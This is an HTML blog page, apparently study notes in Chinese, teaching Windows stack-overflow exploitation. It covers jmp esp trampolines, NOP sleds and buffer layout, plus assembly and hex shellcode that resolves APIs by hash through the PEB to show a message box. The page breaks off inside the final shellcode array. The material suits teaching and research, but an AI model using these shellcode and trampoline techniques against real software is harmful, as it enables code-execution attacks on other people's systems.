@@ -1,0 +1,1658 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="shellcode,stack," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！ 1. shellcode概述1.1 shellcode和exploitshellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。 exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其">
+<meta name="keywords" content="shellcode,stack">
+<meta property="og:type" content="article">
+<meta property="og:title" content="开发shellcode">
+<meta property="og:url" content="http://yoursite.com/2017/06/22/开发shellcode/index.html">
+<meta property="og:site_name" content="上善若水">
+<meta property="og:description" content="其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！ 1. shellcode概述1.1 shellcode和exploitshellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。 exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/shellcode.png">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/shellcode_method.png">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/shellcode2.png">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/shellcode_shift.png">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/shellcode_api.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-22/address_api.jpg">
+<meta property="og:updated_time" content="2017-08-29T12:39:55.849Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="开发shellcode">
+<meta name="twitter:description" content="其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！ 1. shellcode概述1.1 shellcode和exploitshellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。 exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其">
+<meta name="twitter:image" content="http://yoursite.com/images/2017-06-22/shellcode.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/06/22/开发shellcode/"/>
+
+
+
+
+
+  <title>开发shellcode | 上善若水</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">上善若水</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/开发shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">开发shellcode</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T23:14:11+08:00">
+                2017-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！</p>
+<h3 id="1-shellcode概述"><a href="#1-shellcode概述" class="headerlink" title="1. shellcode概述"></a>1. shellcode概述</h3><h4 id="1-1-shellcode和exploit"><a href="#1-1-shellcode和exploit" class="headerlink" title="1.1 shellcode和exploit"></a>1.1 shellcode和exploit</h4><p>shellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。</p>
+<p>exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入，exploit的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode，与shellcode具有一定的通用性不同，exploit往往只是针对特定漏洞而言的。</p>
+<p>Metasploit通过规范化exploit和shellcode之间的接口把漏洞利用的过程封装成易用的模块，大大减少了exploit开发过程中的重复工作，深刻体现了代码重用和模块化、结构化的思想:<br>（1）所有的 exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令地址等关键信息。<br>（2）将常用的shellcode（例如，用于绑定端口反向链接、执行任意命令等）封装成一个个通用的模块，可以轻易地域任意漏洞的exploit进行结合。</p>
+<h4 id="1-2-shellcode需要解决的问题"><a href="#1-2-shellcode需要解决的问题" class="headerlink" title="1.2 shellcode需要解决的问题"></a>1.2 shellcode需要解决的问题</h4><p><b>由于运行在某个动态链接苦衷的函数在程序运行的过程中被动态加载，这时的栈会动态变化，也即调试器中抄出来的shellcode起始地址下次改变了。所以要编写出通用的shellcode，就需要找到一种途径让程序能够自动定位到shellcode的起始地址。</b></p>
+<h3 id="2-定位shellcode"><a href="#2-定位shellcode" class="headerlink" title="2. 定位shellcode"></a>2. 定位shellcode</h3><h4 id="2-1-栈帧移位与jmp-esp"><a href="#2-1-栈帧移位与jmp-esp" class="headerlink" title="2.1 栈帧移位与jmp esp"></a>2.1 栈帧移位与jmp esp</h4><p>动态定位的方法：<br>（1）用内存中任意一个jmp esp指令的地址覆盖函数返回地址，而不是原来手工查出的shellcode起始地址直接覆盖。<br>（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。<br>（3）由于esp在函数返回时仍指向栈区（函数返回地址之后），jmp esp指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。<br>（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode恰好放在函数返回地址之后，这样jmp esp指令执行过后恰好跳进shellcode。</p>
+<p><img src="/images/2017-06-22/shellcode.png" alt="使用“跳板”的溢出利用流程"></p>
+<h4 id="2-2-获取跳板地址"><a href="#2-2-获取跳板地址" class="headerlink" title="2.2 获取跳板地址"></a>2.2 获取跳板地址</h4><font color="#f00">最简单，最实用的是使用msfpescan获取jmp esp的地址，而且速度更快！！！</font>
+
+<p>具体指令是: msfpescan -f -j esp PE文件</p>
+<p>书中给出了另一种方法：</p>
+<p>获取user32.dll内跳转指令地址最直观的方法就是编程搜索内存。其他程序也是如此！</p>
+<p>另一种办法就是使用OllyDbg中的搜索命令指令，对程序命令进行搜索，最终可以找到！搜 JMP ESP 或者 CALL ESP</p>
+<p>获取JMP ESP的代码</p>
+<pre><code>
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define DLL_NAME "user32.dll"
+
+void main()
+{
+    BYTE *ptr;
+    int position, address;
+    HINSTANCE handle;
+    BOOL done_flag = FALSE;
+    handle = LoadLibrary(DLL_NAME);
+    if (!handle)
+    {
+        printf("  load dll erro !");
+        exit(0);
+    }
+
+    ptr = (BYTE*)handle;
+
+    for (position=0; !done_flag; position++)
+    {
+        try
+        {
+            //0xFFE4 is opcode of jmp esp
+            if(ptr[position] == 0xFF && ptr[position+1] == 0xE4)
+            {
+                int address = (int)ptr + position;
+                printf("OPCODE(JMP ESP) found at 0x%x\n", address);
+                done_flag = TRUE;
+            }
+        }
+        catch(...)
+        {
+            int address = (int)ptr + position;
+            printf("END OF 0x%x\n", address);
+            //done_flag = TRUE;
+        }
+    }
+}
+
+</code></pre>
+
+<p>上面的方法很具有局限性，因为将jmp esp重新更换为jmp eax时，上述代码就不可用，需要查询相应的opcode</p>
+<h4 id="2-3-测试shellcode的可执行性"><a href="#2-3-测试shellcode的可执行性" class="headerlink" title="2.3 测试shellcode的可执行性"></a>2.3 测试shellcode的可执行性</h4><p>我们可以在vc6.0中编译相应的汇编代码，最好能够正常执行，能够执行了之后，通过OllyDbg获得相应的代码块，导出即可获得完整的代码。</p>
+<pre><code>
+#include &lt;windows.h&gt;
+
+void main()
+{
+    HINSTANCE LibHandle;
+    char dllbuf[11] = "user32.dll";
+    LibHandle = LoadLibrary(dllbuf);
+    _asm{
+        sub sp,0x440
+        xor ebx,ebx
+        push ebx //cut string
+        push 0x74736577
+        push 0x6C696166 //push failwest
+
+        mov eax,esp //load address of failwest
+        push ebx
+        push eax
+        push eax
+        push ebx
+
+        mov eax, 0x77E16544    //address should be reset in different OS, this is Win 2000 server
+        call eax //call MessageboxA
+        push ebx
+        mov eax, 0x77E70E7D    //address of ExitProcess in Kernel32.dll
+        call eax //call exit(0)
+    }
+}
+</code></pre>
+
+<p>如果使用上述地址能够弹出默认窗口，那么代表上述所用的MessageBoxA和ExitProcess的地址都是正确的。</p>
+<h3 id="3-缓冲区的组织"><a href="#3-缓冲区的组织" class="headerlink" title="3. 缓冲区的组织"></a>3. 缓冲区的组织</h3><h4 id="3-1-缓冲区的组成"><a href="#3-1-缓冲区的组成" class="headerlink" title="3.1 缓冲区的组成"></a>3.1 缓冲区的组成</h4><p>如果选用jmp esp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小，所需shellcode长短等实际情况灵活布置缓冲区。送入缓冲区的数据分以下几种：</p>
+<ol>
+<li>填充物：可以是任意值，但是一般用nop指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。</li>
+<li>淹没返回地址的数据：可以是跳转指令的地址、shellcode的地址，甚至是一个近似shellcode的地址。</li>
+<li>shellcode：可执行的机器代码</li>
+</ol>
+<p>以下是几种缓冲区的组织方式：<br><img src="/images/2017-06-22/shellcode_method.png" alt="不同缓冲区组织方式"><br>当缓冲区较大时，倾向于将shellcode布置到缓冲区中。有以下几个好处：</p>
+<ol>
+<li>合理利用缓冲区，使攻击串的总长度减小；对于远程攻击，有时所有数据必须包含在一个数据包中！</li>
+<li>对程序破坏小，比较稳定；溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。</li>
+</ol>
+<h4 id="3-2-抬高栈顶保护shellcode"><a href="#3-2-抬高栈顶保护shellcode" class="headerlink" title="3.2 抬高栈顶保护shellcode"></a>3.2 抬高栈顶保护shellcode</h4><p>把shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变ESP寄存器中的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push指令在栈中暂存数据，压栈数据很可能会破坏shellcode自身。</p>
+<p>当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），这时shellcode离栈顶较远 ，几次压栈可能只会破坏到一些填充nop；但是，如果缓冲区已经被shellcode占满，则shellcode离栈顶比较近，这时的情况就必要危险。</p>
+<p>为此，为了提高较强的通用性，通常会在shellcode中一开始就大范围抬高栈顶，把shellcode藏在栈内。</p>
+<h4 id="3-3-使用其他跳转指令"><a href="#3-3-使用其他跳转指令" class="headerlink" title="3.3 使用其他跳转指令"></a>3.3 使用其他跳转指令</h4><p>使用jmp esp做“跳板”的方法是最简单，也是最常用的定位shellcode的方法。在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。往往除了ESP之外，EAX、EBX、ESI等寄存器也会指向栈顶附近，故在选择跳转指令地址时也可以灵活一些，除了jmp esp之外，mov eax、esp和jmp eax等指令序列也可以完成进入栈区的功能。</p>
+<p><b><center>常用跳转指令与机器码的对应关系</center></b></p>
+<table>
+<thead>
+<tr>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+<th>机器码（十六进制）</th>
+<th>对应的跳转指令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>FF EO</td>
+<td>JMP EAX</td>
+<td>FF D0</td>
+<td>CALL EAX</td>
+</tr>
+<tr>
+<td>FF E1</td>
+<td>JMP ECX</td>
+<td>FF D1</td>
+<td>CALL ECX</td>
+</tr>
+<tr>
+<td>FF E2</td>
+<td>JMP EDX</td>
+<td>FF D2</td>
+<td>CALL EDX</td>
+</tr>
+<tr>
+<td>FF E3</td>
+<td>JMP EBX</td>
+<td>FF D3</td>
+<td>CALL EBX</td>
+</tr>
+<tr>
+<td>FF E4</td>
+<td>JMP ESP</td>
+<td>FF D4</td>
+<td>CALL ESP</td>
+</tr>
+<tr>
+<td>FF E5</td>
+<td>JMP EBP</td>
+<td>FF D5</td>
+<td>CALL EBP</td>
+</tr>
+<tr>
+<td>FF E6</td>
+<td>JMP ESI</td>
+<td>FF D6</td>
+<td>CALL ESI</td>
+</tr>
+<tr>
+<td>FF E7</td>
+<td>JMP EDI</td>
+<td>FF D7</td>
+<td>CALL EDI</td>
+</tr>
+</tbody>
+</table>
+<h4 id="3-4-不使用跳转指令"><a href="#3-4-不使用跳转指令" class="headerlink" title="3.4 不使用跳转指令"></a>3.4 不使用跳转指令</h4><p>个别苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中，如果过能够淹没大片的内存区域，可以将shellcode布置在一大段nop之后。这时定位shellcode时，只要能跳进这一大片nop中，shellcode就可以得到执行。</p>
+<h4 id="3-5-函数返回地址移位"><a href="#3-5-函数返回地址移位" class="headerlink" title="3.5 函数返回地址移位"></a>3.5 函数返回地址移位</h4><p>一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍过的方法来提高exploit的成功率。</p>
+<p>如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就能得以执行。</p>
+<p><img src="/images/2017-06-22/shellcode2.png" alt="shellcode"></p>
+<font color="#f00">函数返回地址距离我们输入的字符串的偏移在不同的计算机上就可能出现按照字节错位</font>
+
+<p><img src="/images/2017-06-22/shellcode_shift.png" alt="shellcode移位"></p>
+<h3 id="4-开发通用的shellcode"><a href="#4-开发通用的shellcode" class="headerlink" title="4. 开发通用的shellcode"></a>4. 开发通用的shellcode</h3><h4 id="4-1-定位API的原理"><a href="#4-1-定位API的原理" class="headerlink" title="4.1 定位API的原理"></a>4.1 定位API的原理</h4><p>所有win32程序都会加载ntdll.dll和kernel32.dll这两个最基础的动态链接库。如果想要在win32平台上定位kernel32.dll中的API地址，可采用如下方法：<br>（1）首先通过段选择字FS在内存中找到当前的线程环境块TEB<br>（2）线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针<br>（3）进程环境块中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针。其中，存放着已经被进程装载的动态链接库的信息。<br>（4）PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList<br>（5）模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点为kernel32.dll<br>（6）找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址<br>（7）从kernel32.dll的加载基址算起，偏移0x3C的地方就是PE头<br>（8）PE头偏移0x78的地方存放着指向函数导出表的指针<br>（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。</p>
+<ul>
+<li>导出表偏移0x1C处的指针指向存储导出函数偏移地址(RVA)的列表</li>
+<li>导出表偏移0x20处的指针指向存储导出函数函数名的列表</li>
+<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需函数是第几个，然后在地址列表汇总找到对应的RVA</li>
+<li>获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。</li>
+</ul>
+<p><img src="/images/2017-06-22/shellcode_api.jpg" alt="在shellcode中动态定位API的原理"></p>
+<font color="#f00">需要说明的是：上述图中所表现的ntdll.dll过了之后就是kernel32.dll并不完全正确，准确的说这只在window xp及其以前是这样的；但是从win7开始，这两者之间加入了kernelbase.dll</font>
+
+<h4 id="4-2-shellcode的加载与测试"><a href="#4-2-shellcode的加载与测试" class="headerlink" title="4.2 shellcode的加载与测试"></a>4.2 shellcode的加载与测试</h4><p>这一章类似于2.3节的内容，但是有些许的改变，可以与其对照进行查看.</p>
+<pre><code>
+#include &lt;windows.h&gt;
+
+char shellcode[] =
+"\x66\x81\xEC\x40\x04"        // SUB SP, 440
+"\x33\xDB"                    // XOR EBX, EBX
+"\x53"                        // PUSH EBX
+"\x68\x77\x65\x73\x74"        // PUSH 74736577
+"\x68\x66\x61\x69\x6C"        // PUSH 6C696166
+"\x8B\xC4"                    // MOV EAX, ESP
+"\x53"                        // PUSH EBX
+"\x50"                        // PUSH EAX
+"\x50"                        // PUSH EAX
+"\x53"                        // PUSH EBX
+"\xB8\x44\x65\xE1\x77"        // MOV EAX, user32.MessageBoxA
+"\xFF\xD0"                    // CALL EAX
+"\x53"                        // PUSH EBX
+"\xB8\x7D\x0E\xE7\x77"        // MOV EAX, kernel32.ExitProcess
+"\xFF\xD0";                    // CALL EAX
+
+void main()
+{
+    HINSTANCE LibHandle;
+    char dllbuf[11] = "user32.dll";
+    LibHandle = LoadLibrary(dllbuf);
+    __asm
+    {
+        lea eax, shellcode
+        push eax
+        ret
+    }
+}
+</code></pre>
+
+<h4 id="4-3-动态定位API地址的shellcode"><a href="#4-3-动态定位API地址的shellcode" class="headerlink" title="4.3 动态定位API地址的shellcode"></a>4.3 动态定位API地址的shellcode</h4><p>首先需要知道的是：<br>MessageBoxA： user32.dll<br>ExitProcess: kernel32.dll<br>LoadLibraryA: kernel32.dll</p>
+<p>由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容纳，我们总是希望shellcode尽可能短。因此一般不会用“MessageBoxA”这么长的字符串进行直接比较。<br>通常会对所用的API函数进行hash运算，搜索导出表时对当前遇到的函数名同样进行hash。对比之后，判断是否是需要的API。</p>
+<pre><code>
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+DWORD GetHash(char  *fun_name)
+{
+    DWORD digest=0;
+    while(*fun_name)
+    {
+        digest = ((digest<<25)|(digest>>7));    // 循环右移7位
+        digest += *fun_name;                    // 累加
+        fun_name++;
+    }
+    return digest;
+}
+
+void main()
+{
+    DWORD hash;
+    hash = GetHash("AddAtomA");
+    printf("result of hash is %.8x\n", hash);
+}
+</25)|(digest></code></pre>
+
+<p>通过该hash算法获得API函数对应的摘要</p>
+<table>
+<thead>
+<tr>
+<th>API函数</th>
+<th>hash值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MessageBoxA</td>
+<td>0x1e380a6a</td>
+</tr>
+<tr>
+<td>ExitProcess</td>
+<td>0x4fd18963</td>
+</tr>
+<tr>
+<td>LoadLibraryA</td>
+<td>0x0c917432</td>
+</tr>
+</tbody>
+</table>
+<p>在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode中字符串处理方向发生变化而产生错误(如指令LODSD)。</p>
+<p><img src="/images/2017-06-22/address_api.jpg" alt="定位API的流程图"></p>
+<pre><code>
+void main()
+{
+    __asm{
+        CLD                    ;clear flag DF
+        ;store hash
+        push 0x1e380a6a        ;hash of MessageBoxA
+        push 0x4fd18963        ;hash of ExitProcess
+        push 0x0c917432        ;hash of LoadLibraryA
+        mov esi, esp        ;esi = addr of first function hash
+        lea edi,[esi-0xc]    ;edi = addr of start writing function
+
+        ;make some stack space
+        xor ebx,ebx
+        mov bh, 0x04
+        sub esp, ebx
+
+        ;push a pointer to "user32" onto stack
+        mov bx, 0x3233        ;32
+        push ebx
+        push 0x72657375        ;user
+        push esp
+        xor edx,edx
+
+        ;find base addr of kernel32.dll
+        mov ebx, fs:[edx+0x30]        ;ebx = address of PEB
+        mov ecx, [ebx+0x0c]            ;ecx = pointer to loader data
+        mov ecx, [ecx+0x1c]            ;ecx = first entry in initialization order list
+        mov ecx, [ecx]                ;ecx = second entry in list
+        ;mov ecx, [ecx]                ;ebp = base address of kernelbase.dll in after win7
+                                    ;ebp = base address of kernel32.dll in before winxp
+                                    ;some people may think it is the addr of kernel32.dll
+                                    ;but it was wrong
+        mov ebp, [ecx+0x8]            ;under the test, we know it is the addr of kernel32.dll
+
+    find_lib_functions:
+        //lodsd                        ;load next hash into al and increment esi
+        mov eax, [esi]
+        add esi, 0x4
+        cmp eax, 0x1e380a6a            ;hash of MessageBoxA trigger
+                                    ;LoadLibrary("user32")
+        jne find_functions
+        xchg eax,ebp                ;save current hash
+        call [edi - 0x8]            ;LoadLibraryA
+        xchg eax,ebp                ;restore current hash, and update ebp with base address of user32.dll
+
+    find_functions:
+        pushad                        ;preserve registers
+        mov eax, [ebp + 0x3c]        ;eax = start of PE header
+        mov ecx, [ebp + eax + 0x78]    ;ecx = relative offset of export table
+        add ecx, ebp                ;ecx = absolute addr of export table
+        mov ebx, [ecx + 0x20]        ;ebx = relative offset of names table
+        add ebx, ebp                ;ebx = absolute addr of names table
+        xor edi, edi                ;edi will count through the functions
+
+    next_function_loop:
+        inc edi                        ;increment function counter
+        mov esi, [ebx + edi * 4]    ;esi = relative offset of current function name
+        add esi, ebp                ;esi = absolute addr of current function  name
+        cdq                            ;dl will hold hash(we know eax is small)
+
+    hash_loop:
+        movsx eax, byte ptr[esi]
+        cmp al, ah
+        jz compare_hash
+        ror edx, 7
+        add edx, eax
+        inc esi
+        jmp hash_loop
+
+    compare_hash:
+        cmp edx, [esp + 0x1c]    ;compare to the requested hash(saved on stack from pushad)
+        jnz next_function_loop
+        mov ebx, [ecx + 0x24]    ;ebx = relative offset of ordinals table
+        add ebx, ebp            ;ebx = absolute addr of ordinals table
+        mov di, [ebx + 2*edi]    ;di = ordinal number of matched function
+        mov ebx, [ecx + 0x1c]    ;ebx = relative offset of address table
+        add ebx, ebp            ;ebx = absolute addr of address table
+        add ebp, [ebx + 4*edi]    ;add to ebp(base addr of module) the relative offset of matched function
+        xchg eax, ebp            ;move func addr into eax
+        pop edi                    ;edi is last onto stack in pushad
+        stosd                    ;write function addr to [edi] and increment edi
+        push edi
+        popad                    ;restore registers
+                                ;loop until we reach end of the last hash
+        cmp eax, 0x1e380a6a
+        jne find_lib_functions
+
+    function_call:
+        xor ebx, ebx
+        push ebx                ;cut string
+        push 0x74736577
+        push 0x6C696166            ;push failwest
+        mov eax, esp            ;load address of failwest
+        push ebx
+        push eax
+        push eax
+        push ebx
+        call [edi - 0x4]        ;call MessageBoxA
+        push ebx
+        call [edi - 0x8]        ;call ExitProcess
+        nop
+        nop
+        nop
+        nop
+    }
+}
+</code></pre>
+
+<p>其对应的机器码为：</p>
+<pre><code>
+char shellcode2[] = 
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
